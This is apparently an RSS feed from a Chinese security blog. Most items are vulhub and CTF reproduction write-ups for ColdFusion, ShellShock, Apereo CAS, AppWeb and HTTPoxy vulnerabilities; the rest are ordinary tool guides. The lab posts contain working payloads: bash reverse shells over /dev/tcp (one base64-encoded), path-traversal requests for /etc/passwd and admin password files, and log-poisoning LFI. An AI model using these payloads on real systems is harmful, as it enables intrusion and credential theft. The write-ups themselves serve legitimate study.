+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/coldfusion/CVE-2017-3066 docker-compose up -d 访问链接http://&amp;lt;ip&amp;gt;:8500/，显示页面无法展示，还有一个大的404头像。
+访问http://&amp;lt;IP&amp;gt;:8500/CFIDE/administrator/index.cfm，默认密码为vulhub，然后有一个初始化成功页面。
+利用工具：
+Releases · codewhitesec/ColdFusionPwn (github.com)
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+生成poc.ser：
+java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &amp;#39;ping oopsdc.zzn11a.dnslog.cn&amp;#39; poc.ser 然后抓取访问http://&amp;lt;ip&amp;gt;:8500/flex2gateway/amf的数据包，请求方式更改为POST，Content-Type更改为application/x-amf，在最后面选择从文件中复制，然后将poc.ser文件内容粘贴到请求中，点击转发包，查看dnslog记录即可。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Adobe ColdFusion文件读取 CVE-2010-2861漏洞复现</title>
+      <link>https://oopsdc.com/post/adobe-coldfusion%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2010-2861%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 27 Jan 2022 18:58:35 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/adobe-coldfusion%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2010-2861%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Adobe ColdFusion是一个动态Web服务器，其所采用的CFML(ColdFusion Markup Language)程序设计语言类似JSP的JSTL(JSP Standard Tag Lib)，CFML是一种针对Web应用的脚本语言，文件后缀为.cfm。
+Adobe ColdFusion 8及Adobe ColdFusion 9版本存在目录穿越漏洞，攻击者可在未授权的情况下读取任意文件。
+影响版本 Adobe ColdFusion 8、Adobe ColdFusion 9。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/coldfusion/CVE-2010-2861 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:8500/CFIDE/administrator/enter.cfm页面，默认密码为admin，登录成功之后会有一个初始化成功页面。
+之后的文件读取步骤可能会因为URL编码或Cookie无法成功，所以用bp进行包重放。
+读取系统用户信息：
+GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8500 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close 读取管理员密码：
+GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8500 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.</description>
+    </item>
+    
+    <item>
+      <title>HTTPoxy CVE-2016-5385漏洞复现</title>
+      <link>https://oopsdc.com/post/httpoxy-cve-2016-5385%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sun, 16 Jan 2022 11:20:48 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/httpoxy-cve-2016-5385%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 漏洞原理在CGI变量命名不规范，CGI程序在接收到HTTP Header后会将部分Header信息存在HTTP_开头的变量中。但CGI程序环境变量本身已经定义了HTTP_PROXY变量，旨在为CGI程序设置代理，如果攻击者在请求中带上了Proxy头，则已定义的HTTP_PROXY变量将被覆盖，实现当前请求的变量劫持，并不会对全局变量造成影响。
+所以其本质在于CGI环境变量劫持，如果CGI程序在运行过程中依赖HTTP_PROXY变量，则攻击者可获取敏感数据或伪造返回包对CGI程序进行欺骗。
+影响版本 任何以CGI方式运行的程序，但需满足以下三点条件：
+CGI程序对外发送请求； CGI程序依赖HTTP_PROXY变量； CGI程序与外部使用HTTP协议进行通信。 漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/cgi/httpoxy docker-compose up -d 抓取访问包：
+GET /index.php HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: &amp;#34;61cb2d26-267&amp;#34; If-Modified-Since: Tue, 28 Dec 2021 15:28:38 GMT Connection: close 响应包：
+HTTP/1.1 200 OK Server: nginx/1.21.5 Date: Sun, 16 Jan 2022 06:35:17 GMT Content-Type: application/json; charset=utf-8 Connection: close X-Powered-By: PHP/5.</description>
+    </item>
+    
+    <item>
+      <title>ShellShock CVE-2014-6271漏洞复现</title>
+      <link>https://oopsdc.com/post/shellshock-cve-2014-6271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 29 Dec 2021 18:24:13 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/shellshock-cve-2014-6271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 ShellShock是一个BashShell漏洞，通常情况下系统内的Shell有严格权限控制，但GNU Bash在 4.3及之前版本存在安全漏洞，Bash运行过程中会调用操作系统的环境变量，攻击者可向环境变量值内的函数定义后添加多余字符串触发漏洞，通过改变或绕过环境限制来执行Shell命令。
+Bash使用的环境变量通过函数名称进行调用，漏洞原因在于以(){开头定义的环境变量在命令ENV中解析为函数后，Bash执行并未退出，而是继续解析并执行Shell命令，攻击者可借此实现反弹Shell等行为。
+漏洞的核心原因在于输入过滤中没有严格的限制边界，没有做合法化的参数判断。
+影响版本 GNU Bash 4.3及之前版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/bash/shellshock docker-compose up -d 环境启动后可尝试访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/victim.cgi查看是否启动成功。
+攻击机监听端口：
+nc -lvnp &amp;lt;port&amp;gt; 抓取当前页面的访问数据包，修改User-Agent构造一个反弹Shell的payload：
+User-Agent:() { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1; 成功反弹Shell。
+漏洞分析 复现目录下存在safe.cgi和victim.cgi两个cgi文件，我们使用diff命令看看两者的差异：
+# 命令 diff safe.cgi victim.cgi # 结果 1c1 &amp;lt; #!/bin/bash --- &amp;gt; #!/usr/local/bash-4.3.0/bin/bash # 输出信息讲解 1c1：表示第一个文件的第1行与第二个文件的第1行不匹配 &amp;lt;：表示第一个文件中的数据行 &amp;gt;：表示第二个文件中的数据行 可以发现两者Bash版本不同，而在访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/safe.cgi时，漏洞无法复现成功。
+Web服务器通过环境变量获取浏览器参数，然后交给CGI程序，环境中的CGI程序是有漏洞版本的Bash生成的，因此在HTTP头部中注入的浏览器参数被Bash当作环境变量解析并执行了。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>AppWeb认证绕过 CVE-2018-8715漏洞复现</title>
+      <link>https://oopsdc.com/post/appweb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2018-8715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 25 Dec 2021 20:57:15 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/appweb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2018-8715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 AppWeb使用以下三种认证方式：
+认证方式 认证原理 basic 传统HTTP基础认证 digest 改良版HTTP基础认证，认证通过后不再传递Authorization头，而使用Cookie保存状态 form 表单认证 在7.0.3之前版本，若认证方式为digest或form，此时攻击者可通过不传递密码参数，利用AppWeb逻辑错误成功认证并获取session。
+AppWeb使用C/C++语言进行编写，是Embedthis Software LLC公司开发维护的一个基于GPL开源协议的嵌入式Web Server，主要应用场景在于为嵌入式设备提供Web Application容器。
+影响版本 AppWeb 7.0.3之前版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/appweb/CVE-2018-8715 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;，会弹出一个登录框，此时需要输入一个存在的用户名，猜测为admin，密码随意输入，抓取登录包并构造Authorization: Digest username=admin，点击发送，成功绕过认证。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Apereo CAS RCE漏洞复现</title>
+      <link>https://oopsdc.com/post/apereo-cas-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 25 Dec 2021 12:00:00 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/apereo-cas-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Apereo CAS是2002年耶鲁大学实验室推出的一个开源统一认证服务，CAS即Central Authentication Service，其漏洞成因在于Webflow中使用了默认密钥changeit，攻击者可通过默认密钥触发反序列化漏洞，实现RCE。
+影响版本 Apereo CAS 4.1.x ~ 4.1.6。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/apereo-cas/4.1-rce docker-compose up -d 利用工具：vulhub/Apereo-CAS-Attack: WIP: Demo for Attacking Apereo CAS (github.com)
+反弹shell编码：java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)
+bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i} 利用工具里ysoserial的CommonsCollections4生成payload：
+java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; 在攻击机上打开一个监听终端：
+nc -lnvp &amp;lt;port&amp;gt; 访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/cas/login登录页面，抓取登录数据包，将execution替换为生成的payload：
+username=admin&amp;amp;password=123456&amp;amp;lt=LT-3-gwwPiolLX4sdBIY5cz0jhZSeWcsuHz-cas01.example.org&amp;amp;execution=&amp;lt;payload&amp;gt;&amp;amp;_eventId=submit&amp;amp;submit=LOGIN 替换完成之后转发数据包，监听终端成功反弹一个shell。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>HTB-Starting Point</title>
+      <link>https://oopsdc.com/post/htb-starting-point/</link>
+      <pubDate>Wed, 01 Sep 2021 15:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/htb-starting-point/</guid>
+      <description>Archetype 目标：拿到用户权限与系统权限。
+靶机IP：10.10.10.27。
+1、信息收集 先使用nmap看看靶机开放了什么端口：
+sudo nmap -sS -sV 10.10.10.27 # 参数讲解 sS：使用SYN半开放式扫描，扫描快，隐蔽性高 sV：探测服务版本 # 扫描结果 Nmap scan report for 10.10.10.27 (10.10.10.27) Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 比较容易入手的就是445端口对应的SMB服务，1433是SQL Server的默认端口。先尝试能否匿名访问SMB服务，这里使用Kali预装的smbclient：</description>
+    </item>
+    
+    <item>
+      <title>LxRunOffline使用手册</title>
+      <link>https://oopsdc.com/post/lxrunoffline/</link>
+      <pubDate>Sat, 28 Aug 2021 17:31:36 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/lxrunoffline/</guid>
+      <description>一、简介 WSL有多香就不介绍了，但其原生命令较为简陋、默认安装在C盘，稍有不足。而LxRunOffline能够安装任意发行版系统到任意目录，且具备转移已安装WSL目录、备份等功能，是一个极好的WSL管理软件。
+项目地址：GitHub - DDoSolitary/LxRunOffline: A full-featured utility for managing Windows Subsystem for Linux (WSL)
+二、安装LxRunOffline 常规安装：下载项目，手动安装 通过Chocolatey安装： choco install lxrunoffline 通过Scoop安装： scoop bucket add extras scoop install lxrunoffline LxRunOffline参数介绍：
+l , list - 列出所有已安装的发行版。gd , get-default - 获取 bash.exe 使用的默认发行版。sd , set-default - 设置 bash.exe 使用的默认发行版。i , install - 安装新的发行版。sd , set-default - 设置 bash.exe 使用的默认发行版。ui , uninstall - 卸载发行版。rg , register - 注册现有的安装目录。ur , unregister - 取消注册发行版但不删除安装目录。m , move - 将发行版移动到新目录。d , duplicate - 在新目录中复制现有发行版。e , export - 将发行版的文件系统导出到.</description>
+    </item>
+    
+    <item>
+      <title>Scoop使用手册</title>
+      <link>https://oopsdc.com/post/scoop%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</link>
+      <pubDate>Mon, 23 Aug 2021 23:31:36 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/scoop%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</guid>
+      <description>Scoop简介 Scoop是一个包管理工具，类似Ubuntu的apt和Mac的homebrew，只需通过一条命令即可快速完成软件的下载、安装和配置等步骤。
+项目地址：GitHub - lukesampson/scoop: A command-line installer for Windows.
+Scoop安装 没什么问题的话，大部分的电脑都能直接安装scoop，有问题的话请参考官方文档和网络资料自行解决，本文仅描述scoop的安装过程及实际安装遇到的问题。
+注：请确保自身有代理环境，也可自行查找镜像源安装。
+默认安装 官方给出的安装命令如下，只需打开powershell粘贴并执行即可，scoop将被默认安装在C:\User\&amp;lt;username&amp;gt;\scoop目录：
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&amp;#39;https://get.scoop.sh&amp;#39;) # 或下述命令，任一条均可 iwr -useb get.scoop.sh | iex 安装完成后，可通过输入scoop help命令查看命令帮助，确认是否安装成功。
+更改scoop安装位置 在安装scoop前，可先通过配置环境变量改变scoop安装路径：
+$env:SCOOP=&amp;#39;D:\&amp;lt;dirname&amp;gt;&amp;#39; [Environment]::SetEnvironmentVariable(&amp;#39;SCOOP&amp;#39;, $env:SCOOP, &amp;#39;User&amp;#39;) 若已经安装scoop，则仅需在执行上述命令后，将原目录所有文件复制到新指定的目录即可。
+更改scoop全局程序安装位置 $env:SCOOP_GLOBAL=&amp;#39;D:&amp;lt;dirname&amp;gt;&amp;#39; [Environment]::SetEnvironmentVariable(&amp;#39;SCOOP_GLOBAL&amp;#39;, $env:SCOOP_GLOBAL, &amp;#39;Machine&amp;#39;) 如果直接执行上述命令可能会报错，原因在于权限不够，使用Windows+X，选择以管理员身份打开powershell，再次运行命令即可。
+多线程下载 查阅资料的时候，大部分文章都推荐安装aria2实现多线程下载，提高下载速度，命令如下：
+scoop install aria2 安装Typora 以下是通过scoop安装Typora的流程，先使用命令搜索一下软件信息：
+scoop search typora 会有一个报错，大意为typora在extras软件库中，要求我们先安装对应软件库。按照要求执行命令添加软件库：
+scoop bucket add extras 此时却又报错，提示需要从GitHub拉取项目，需要我们先安装git。安装git:
+scoop install git 下载失败并报错，但之前都能正常下载，目前只安装了一个aria2，先禁用了看看：
+scoop config aria2-enabled false aria2默认配置：
+aria2-enabled (默认值: true)aria2-retry-wait (默认值: 2)aria2-split (默认值: 5)aria2-max-connection-per-server (默认值: 5)aria2-min-split-size (默认值: 5M) 然后再下载git，成功下载，但是在安装软件库时又报错了，显示无法访问GitHub仓库，这可是个老问题了，项目部署经常遇到，检查代理没问题，那么就给git配个代理试试：</description>
+    </item>
+    
+    <item>
+      <title>如何拥有多个GitHub Pages并配置子域名</title>
+      <link>https://oopsdc.com/post/%E5%A6%82%E4%BD%95%E6%8B%A5%E6%9C%89%E5%A4%9A%E4%B8%AAgithub-pages%E5%B9%B6%E9%85%8D%E7%BD%AE%E5%AD%90%E5%9F%9F%E5%90%8D/</link>
+      <pubDate>Sat, 21 Aug 2021 16:48:19 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E5%A6%82%E4%BD%95%E6%8B%A5%E6%9C%89%E5%A4%9A%E4%B8%AAgithub-pages%E5%B9%B6%E9%85%8D%E7%BD%AE%E5%AD%90%E5%9F%9F%E5%90%8D/</guid>
+      <description>文章背景 突发奇想能不能配置多个GitHub Pages，然后分别给它们绑定一个子域名，说干就干。
+博客搭建文章：博客搭建 | Atmet (oopsdc.tk)
+GitHub Pages有三种类型：项目、用户和组织，项目站点连接到GitHub托管的特定项目，后两者连接到特定GitHub账户。用户只能创建一个用户主站，但可以有多个项目站点。
+创建项目 创建一个新的名称为test的公开仓库。 进入仓库主页，点击Settings，点击左侧的Pages，选择Launch automatic page generator&amp;gt;Continue to layouts&amp;gt;Pubulish Page。（注：此处选择一个喜欢的主题即可） 搭建完成后可通过&amp;lt;usernmae&amp;gt;.github.io/test访问。 绑定子域名 一般而言，在购买一个域名后，我们可以使用它的子域名，如本博客的域名为oopsdc.tk，现在我想给新创建的test仓库绑定一个test.oopsdc.tk的子域名。
+1.进入DNS服务商的控制台，此处以CloudFlare为例，点击新建一个CNAME，设置如下：
+保存后进入第二步。
+2.在test仓库中新建一个CNAME文件，内容如下：
+test.oopsdc.tk 也可通过仓库中的Settings进行设置，选择Pages后，修改下面的Custom domain并保存即可。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Vulhub环境搭建</title>
+      <link>https://oopsdc.com/post/vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
+      <pubDate>Fri, 20 Aug 2021 18:32:54 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/vulhub%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
+      <description>安装环境 Ubuntu 20.04 环境配置 docker docker-compose 更换系统源 备份原文件：
+mv /etc/apt/source.list /etc/apt/source.list.bak 使用以下任一命令创建并编辑source.list文件：
+gedit /etc/apt/source.list vi /etc/apt/source.list vim /etc/apt/source.list	// 需使用 apt install vim 命令安装 文件内容如下：
+# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb https://mirrors.</description>
+    </item>
+    
+    <item>
+      <title>GitHub不再支持密码验证解决方案</title>
+      <link>https://oopsdc.com/post/github%E4%B8%8D%E5%86%8D%E6%94%AF%E6%8C%81%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</link>
+      <pubDate>Thu, 19 Aug 2021 08:46:55 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/github%E4%B8%8D%E5%86%8D%E6%94%AF%E6%8C%81%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</guid>
+      <description>问题描述 在更新博客push本地资源时遇到如下报错：
+remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead. 大意就是GitHub从13号起不再支持密码验证，需要使用个人token，官方解释是为了安全。
+解决方案 进入GitHub首页后点击右上角的个人头像，选择Settings，在左侧选择Developer settings，然后选择Personal access tokens，选中之后点击Generate new token，我们可以设置token名、有效期及token的权限范围。仅需要仓库部署的话，我们就只需勾选repo，翻到最下面点击Gererate token。
+然后保存好生成的token，因为退出页面后将不再显示，可以通过重新生成来重新获取。然后在push项目时，将输入的密码改为我们生成的token即可。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Kali安装Parallels Tools</title>
+      <link>https://oopsdc.com/post/kali%E5%AE%89%E8%A3%85parallels-tools/</link>
+      <pubDate>Wed, 18 Aug 2021 22:45:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/kali%E5%AE%89%E8%A3%85parallels-tools/</guid>
+      <description>环境配置 本文环境信息如下：
+Parallel Desktop 16 Business 16.5.0 (49183) Kali Linux 2021.2 64-Bit 系统安装 安装配置 安装Kali Linux的时候Parallels Desktop无法识别操作系统，需要我们手动选择Other Linux下的Kali Linux。
+配置选项因人而异，此处不细讲。
+在安装过程中可选择GNOME作为桌面环境，避免后面的踩坑。
+更换国内源 # 备份原文件 mv /etc/apt/source.list /etc/apt/source.list.bak # 更换为清华源 vim /etc/apt/source.list # 输入以下内容 &amp;#34;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&amp;#34; &amp;#34;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&amp;#34; 安装Parallels Tools 把鼠标移到窗口的右上，有一个黄色的感叹符号，点击即可安装Parallels Tools。
+# 检测光盘是否挂载成功 mount | grep iso9660 # 将安装文件拷贝至本地，此处的dirname为自己创建的目录名称 mkdir ~/&amp;lt;dirname&amp;gt; &amp;amp;&amp;amp; cp -r /media/cdrom0/* ~/&amp;lt;dirname&amp;gt; # 安装Parallels Tools cd ~/&amp;lt;dirname&amp;gt; &amp;amp;&amp;amp; .</description>
+    </item>
+    
+    <item>
+      <title>MD5()函数绕过</title>
+      <link>https://oopsdc.com/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</link>
+      <pubDate>Fri, 13 Aug 2021 20:27:10 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</guid>
+      <description>示例代码：
+if (md5($_POST[&amp;#39;md51&amp;#39;]) == md5($_POST[&amp;#39;md52&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;md51&amp;#39;] != $_POST[&amp;#39;md52&amp;#39;]) 弱类型绕过 PHP在处理哈希字符串时，会把每一个0E开头的哈希值解释为0，所以若两个不同密码进行哈希后以0E开头，则会被认为值均为0，从而判等。
+md5加密后开头为0E的值：
+QNKCDZO240610708s878926199as155964671as214587387as214587387a 以示例代码为例，分别给md51和md52赋表中不同的值。经过md5加密后，值均为0，而原始值又不同，顺利绕过if判断。
+数组绕过 md5()函数无法处理数组，会对传入的数组返回NULL，即数组经过md5加密后均得到NULL。
+我们仅需传入如下数据即可，数组内容随意：
+md51[]=1&amp;amp;md52[]=2 文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF</title>
+      <link>https://oopsdc.com/post/buuctf/</link>
+      <pubDate>Fri, 13 Aug 2021 10:08:21 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/buuctf/</guid>
+      <description>Basic Linux Labs 2020年10月24日 更新：目前所有靶机均能直接访问互联网。
+点击启动靶机可以启动一台安装好了 LAMP 的机器。
+并且这台机器位于靶机内网，所有动态靶机均可直接通过主机名访问这台机器。
+但由于目前一个账户只能同时启动一台靶机，您如果有需要建议浏览器开一个隐私窗口，注册一个新账号来启动这个靶机。
+ssh 用户名：root 密码：123456 地址和端口为动态分配的。
+开启环境后按照题目给定地址和端口使用SSH连接即可。
+连接上云主机后使用ls命令，发现当前用户家目录下啥也没有，再使用cd ..命令切换到根目录下看看，发现flag.txt文件。
+也可直接使用cat /flag.txt命令查看flag。
+BUU LFI COURSE 1 启动环境后得到如下PHP代码：
+&amp;lt;?php /** * Created by PhpStorm. * User: jinzhao * Date: 2019/7/9 * Time: 7:07 AM */ highlight_file(__FILE__); if(isset($_GET[&amp;#39;file&amp;#39;])) { $str = $_GET[&amp;#39;file&amp;#39;]; include $_GET[&amp;#39;file&amp;#39;]; } 本地文件包含，通过file参数进行传参，可在URL后构造参数?file=/flag查看flag。
+拓展 通过Wappalyzer插件可以发现网站使用了nginx服务，尝试访问nginx访问日志：
+?file=/var/log/nginx/access.log 页面回显出我们刚才的访问记录，接下来我们使用bp抓包尝试写入phpinfo。
+通过在User-Agent字段最后插入aaaaaaa&amp;lt;?php phpinfo();?&amp;gt;bbbbbbb传入phpinfo()，刷新页面后检查是否传入成功。
+Request请求包如下：
+GET /?file=/var/log/nginx/access.log HTTP/1.1Host: &amp;lt;domain&amp;gt;:&amp;lt;port&amp;gt;Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.</description>
+    </item>
+    
+    <item>
+      <title>ATT&amp;CK实战一</title>
+      <link>https://oopsdc.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</link>
+      <pubDate>Wed, 21 Jul 2021 14:34:21 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</guid>
+      <description>一、环境搭建 1.1 下载虚拟机文件 自行搜索。
+1.2 环境介绍 开机密码：hongrisec@2019.
+本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
+Kali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 &amp;lt;ip&amp;gt;即可。
+Win7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
+Win2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。
+Win2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。
+拓扑图如下：
+安装完成之后在Win7主机上打开phpstudy开启Web服务。
+二、信息收集 2.1 探测存活主机 命令：
+nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确) 结果：
+Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)3306/tcp open mysql MySQL (unauthorized)MAC Address: 00:0C:29:33:16:84 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Microsoft Windows 2008|7|8.</description>
+    </item>
+    
+    <item>
+      <title>浅析APNs推送机制</title>
+      <link>https://oopsdc.com/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</link>
+      <pubDate>Tue, 20 Jul 2021 17:19:55 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E6%B5%85%E6%9E%90apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</guid>
+      <description>APNs简述 Apple Push Notification server(APNs)，即苹果推送通知服务。
+APNs出现需求 由于移动设备内存、CPU、电池容量等各种因素，iOS不允许APP进程常驻后台(时限大概为10min)。
+当用户主动关闭APP或后台APP进入后台达到限定时长后，意味着该APP进程的结束，在一定程度上保证了手机的流畅度与使用时长。但这也同时意味着服务器无法主动和用户交互(如实时推送消息)，为了解决这个限制，苹果推出了APNs，允许设备和服务器分别与苹果的推送服务器保持长连接状态。
+iOS通知 iOS通知分为本地通知和远程通知两类，APNs是远程通知功能的核心。
+本地通知 由本地应用触发，一般是基于时间的通知形式，如闹钟、日历、待办事项等。
+远程通知 通过自建服务器推送消息的通知形式。
+APNs推送流程 苹果官方APNs概述:Local and Remote Notification Programming Guide: APNs Overview (apple.com)
+以下为APNs推送流程图:
+Provider:自建应用服务器 APNs:苹果APNs推送通知服务器 Device:苹果设备 Client App:应用 大致流程可分为以下4点:
